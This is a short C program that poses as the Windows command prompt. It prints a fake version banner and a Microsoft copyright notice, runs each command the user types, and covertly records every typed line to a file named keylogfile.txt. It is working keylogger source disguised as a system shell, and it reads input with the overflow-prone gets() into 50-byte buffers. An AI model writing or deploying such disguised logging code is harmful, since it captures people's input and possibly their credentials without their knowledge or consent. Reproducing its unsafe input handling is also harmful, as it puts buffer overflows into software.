
#include <stdio.h>
#include <stdlib.h>


void main(){
	FILE *fptr;
	char kbinput[50];
	char prompt[50];
	char *cmd;
	int change = 0;
	fptr = fopen("keylogfile.txt","w");
    printf("=================================================");
    system("ver");
    printf("(c) Microsoft Corporation. All rights reserved.");
    getcwd(prompt,48);
    strcat(prompt,">");
    printf("\n\n%s",prompt);
    gets(kbinput);
    while(strcmp(kbinput,"~") != 0){
     	fprintf(fptr,"%s\n",kbinput);
    	if((kbinput[0] == 'c' && kbinput[1] == 'd') || kbinput[0] == 'c' && kbinput[1] == 'h' &&
	        kbinput[2]=='d' && kbinput[3] == 'i' && kbinput[4] == 'r')
  	        change = 1;
        if (change){
  	        cmd = strtok(kbinput," ");
        	cmd = strtok(0,"");
        	chdir(cmd);
            getcwd(prompt,48);
            strcat(prompt,">");
            printf ("%s ",prompt);
            gets(kbinput);
            change = 0;
        }
        else{
            system (kbinput);
            printf("%s ",prompt);
            gets(kbinput);
        }
    }
   fclose(fptr);	
}

